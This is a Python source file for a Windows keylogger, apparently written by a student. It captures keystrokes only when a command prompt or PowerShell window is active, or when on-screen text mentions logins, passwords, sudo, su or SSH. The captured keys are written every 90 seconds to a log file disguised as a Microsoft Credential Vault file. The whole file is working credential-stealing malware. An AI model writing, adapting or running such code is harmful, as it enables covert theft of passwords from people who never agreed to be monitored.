# Author: Winter Sager wrs9226@g.rit.edu

from pynput import keyboard
import logging
import threading
import pygetwindow as gw
import win32console, win32gui
import os
# Keyboard needed to grab key events

path = r"C:\Users\Default\AppData\Roaming\Microsoft\Vault\CredVaultSync.txt"
# if path doesn't exist, create it. 

if not os.path.exists(os.path.dirname(path)):
    os.makedirs(os.path.dirname(path))

targets = ["cmd.exe", "powershell", "command_prompt"]
internal_targets = ["Login", "Sign In", "Password", "Sudo", "su", "SSH", "king", "duke", "knight", "lady", "baron", "scribe", "apothecary", "shepard", "blacksmith", "herald"]

buffer = ""
last_window = ""
time_interval = 90

logging.basicConfig(filename=path, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def get_internal_function():
    try:
        wind_hand = win32gui.GetForegroundWindow()
        if any(t in win32gui.GetWindowText(wind_hand).lower() for t in targets):
            # Find where the cursor is! 
            screen = win32console.CreateConsoleScreenBuffer()
            info = screen.GetConsoleScreenBufferInfo()
            # Read line
            starting_position = win32console.PyCOORDType(0, max(0, info['CursorPosition'].Y - 1))
            return screen.ReadConsoleOutputCharacter(info['Size'].X * 2, starting_position).lower()
    except: 
        pass
    return ""

def log_when_pressed(key):
    global buffer, last_window
    log_file = "keys.txt"
    # file to log to
    try: #error handling
        current_window = gw.getActiveWindowTitle()
        inside_text = get_internal_function()
        
        # Only grab the key/password if it is involved in a login
        
        if any(target.lower() in current_window.lower() for target in targets) or any(i in inside_text for i in internal_targets):
            # makes a note of what is being displayed when the password is logged
            if current_window != last_window:
                buffer += f"\n[Target: {current_window}]\n"
                last_window = current_window

            #Log whatever the key is and attribute error will log special characters
            try:
                buffer += key.char
            except AttributeError:
                if key == keyboard.Key.space: buffer += " "
                elif key == keyboard.Key.enter: buffer += "\n"
                else: buffer += f"[{key}]"    
        else:
            # if the window is not related to logins, skip it
            pass
    except Exception:
        pass

def write_log():
    global buffer
    threading.Timer(time_interval, write_log).start()
    if buffer:
        logging.info(buffer)
        buffer = ""

def main():
    print("Listening")    
    write_log()
    with keyboard.Listener(on_press=log_when_pressed) as listener:
        listener.join()


if __name__ == "__main__":
    main()

